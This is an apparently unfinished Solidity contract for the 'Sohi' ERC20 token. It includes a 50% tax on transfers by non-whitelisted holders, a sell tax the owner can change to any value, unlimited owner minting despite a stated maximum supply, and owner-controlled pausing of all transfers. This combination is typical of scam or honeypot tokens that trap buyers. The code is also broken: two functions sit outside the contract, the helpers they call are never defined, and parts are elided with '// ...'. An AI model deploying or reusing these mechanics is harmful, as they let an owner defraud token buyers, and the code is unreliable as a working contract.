// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/extensions/ERC20BurnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/extensions/ERC20SnapshotUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/security/PausableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/extensions/draft-ERC20PermitUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

/// @custom:security-contact info@moneygpt.pro
contract Sohi is Initializable, ERC20Upgradeable, ERC20BurnableUpgradeable, ERC20SnapshotUpgradeable, OwnableUpgradeable, PausableUpgradeable, ERC20PermitUpgradeable, UUPSUpgradeable {
    uint256 private _maxSupply;

/// @custom:oz-upgrades-unsafe-allow constructor
constructor() {
    _disableInitializers();
}

function initialize() initializer public {
    __ERC20_init("Sohi Token", "Sohi");
    __ERC20Burnable_init();
    __ERC20Snapshot_init();
    __Ownable_init();
    __Pausable_init();
    __ERC20Permit_init("Sohi");
    __UUPSUpgradeable_init();

    _maxSupply = 1000000000000 * 10 ** decimals(); // 设置最大供应量
    _mint(msg.sender, _maxSupply); // 所有代币在部署时全部打入合约所有者账户
}

function snapshot() public onlyOwner {
    _snapshot();
}

function pause() public onlyOwner {
    _pause();
}

function unpause() public onlyOwner {
    _unpause();
}

function mint(address to, uint256 amount) public onlyOwner {
    _mint(to, amount);
}

function _beforeTokenTransfer(address from, address to, uint256 amount)
    internal
    whenNotPaused
    override(ERC20Upgradeable, ERC20SnapshotUpgradeable)
{
    super._beforeTokenTransfer(from, to, amount);
}

function _authorizeUpgrade(address newImplementation)
    internal
    onlyOwner
    override
{}

function abandonOwnership() public onlyOwner {
    renounceOwnership();
}

    mapping (address => bool) private _whitelist;
    uint256 private _sellTax = 50;

    // ...

    function _addToWhitelist(address account) internal {
        _whitelist[account] = true;
    }

    function _removeFromWhitelist(address account) internal {
        _whitelist[account] = false;
    }

    function _isWhitelisted(address account) internal view returns (bool) {
        return _whitelist[account];
    }

    function _applySellTax(address sender, uint256 amount) internal view returns (uint256) {
        if (!_whitelist[sender]) {
            return amount * _sellTax / 100;
        }
        return 0;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        uint256 taxAmount = _applySellTax(msg.sender, amount);
        return super.transfer(recipient, amount - taxAmount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        uint256 taxAmount = _applySellTax(sender, amount);
        return super.transferFrom(sender, recipient, amount - taxAmount);
    }

    // ...
}

 function manageWhitelist(address account, bool action) public onlyOwner {
        if (action) {
            _addToLP(account);
        } else {
            _removeFromLP(account);
        }
    }

    function setdivi(uint256 newTax) public onlyOwner {
        _sellTax = newTax;
    }

 